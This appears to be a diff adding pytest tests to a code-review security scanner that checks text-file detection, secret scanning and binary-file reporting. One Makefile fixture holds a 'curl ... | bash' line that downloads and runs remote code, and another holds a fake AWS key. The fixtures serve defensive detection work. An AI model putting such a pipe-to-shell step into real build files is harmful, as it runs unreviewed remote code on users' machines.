@@ -180,3 +180,21 @@ def test_any_batch_with_serious_issue_flags(monkeypatch):
     big = "\n".join(f"X_{i} = {i}" for i in range(9000))
     tv = two_view.two_view_check({"a.py": big, "z.py": "import os\nos.system(c)\n"}, "harmless refactor")
     assert tv.manipulation_suspected is True
+
+
+def test_text_detection_is_content_based(tmp_path):
+    from core.reviewer.static_scan import is_text_file
+    (tmp_path / "Makefile").write_text("deploy:\n\tcurl -s https://x.io | bash\n")
+    (tmp_path / "blob.bin").write_bytes(b"\x7fELF\x00\x01\x02")
+    (tmp_path / "notes").write_text("plain text without extension, ünïcode ok")
+    assert is_text_file(tmp_path / "Makefile") and is_text_file(tmp_path / "notes")
+    assert not is_text_file(tmp_path / "blob.bin")
+
+
+def test_unknown_extensions_are_scanned_and_binaries_reported(tmp_path):
+    key = "AKIA" + "Q" * 16
+    (tmp_path / "deploy.conf").write_text(f"aws_key = {key}\n")
+    (tmp_path / "tool.so").write_bytes(b"\x00\x01binary")
+    findings, errors = scan_files([tmp_path / "deploy.conf", tmp_path / "tool.so"], tmp_path)
+    assert any(f.rule == "aws_access_key" and f.file == "deploy.conf" for f in findings)
+    assert any("binary files not reviewed: tool.so" in e for e in errors)
